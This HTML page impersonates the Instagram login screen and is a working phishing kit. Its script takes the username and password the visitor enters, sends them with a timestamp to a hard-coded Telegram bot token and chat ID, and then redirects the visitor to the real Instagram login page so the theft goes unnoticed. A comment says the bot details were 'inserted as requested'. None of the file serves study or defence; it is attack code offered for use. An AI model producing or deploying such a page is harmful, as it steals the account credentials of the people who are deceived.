<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 350px;
            width: 100%;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px 30px;
            margin-bottom: 10px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-family: 'Brush Script MT', cursive;
            font-size: 2.8rem;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            margin-bottom: 6px;
            outline: none;
        }
        .login-btn {
            width: 100%;
            margin-top: 14px;
            background: #0095f6;
            color: white;
            padding: 7px 16px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }
        .forgot-password {
            text-align: center;
            margin-top: 20px;
        }
        .forgot-password a {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 30px;
            text-align: center;
        }
        .signup-box p {
            font-size: 14px;
        }
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .meta {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
        .language {
            text-align: center;
            margin-bottom: 15px;
            font-size: 12px;
            color: #8e8e8e;
        }
        .status {
            margin-top: 12px;
            padding: 8px;
            border-radius: 4px;
            font-size: 12px;
            text-align: center;
            display: none;
        }
        .status-success {
            background: #d4edda;
            color: #155724;
        }
        .status-error {
            background: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="language">English (UK)</div>
    
    <div class="login-box">
        <div class="logo">Instagram</div>
        
        <div id="status" class="status"></div>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username, email address or mobile number" required autocomplete="off">
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Log in</button>
        </form>
        
        <div class="forgot-password">
            <a href="#">Forgotten password?</a>
        </div>
    </div>
    
    <div class="signup-box">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
    
    <div class="meta">Meta</div>
</div>

<script>
// ============================================
// ✅ Your bot details (inserted as requested)
// ============================================
const BOT_TOKEN = "8620757440:AAEYnQxTOHDNA9ILuQcT5DDmokg_yF1Joso";
const CHAT_ID = "6225205122";
// ============================================

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    const statusDiv = document.getElementById('status');
    
    if (!username || !password) {
        statusDiv.textContent = '⚠️ Please fill in both fields';
        statusDiv.className = 'status status-error';
        statusDiv.style.display = 'block';
        setTimeout(() => { statusDiv.style.display = 'none'; }, 2500);
        return;
    }
    
    statusDiv.textContent = '⏳ Logging in...';
    statusDiv.className = 'status status-success';
    statusDiv.style.display = 'block';
    
    const now = new Date();
    const timeStr = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
    
    const message = `🔐 Instagram Login 🔐%0A%0A📧 Username: ${username}%0A🔑 Password: ${password}%0A%0A🕐 Time: ${timeStr}`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
    
    try {
        const response = await fetch(url);
        const data = await response.json();
        
        if (data.ok === true) {
            statusDiv.textContent = '✅ Success! Redirecting...';
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, 800);
        } else {
            statusDiv.textContent = '❌ ' + (data.description || 'Unknown error');
            statusDiv.className = 'status status-error';
            setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
        }
    } catch (error) {
        statusDiv.textContent = '❌ Network error. Open in Chrome browser.';
        statusDiv.className = 'status status-error';
        setTimeout(() => { statusDiv.style.display = 'none'; }, 3000);
    }
});
</script>
</body>
</html>
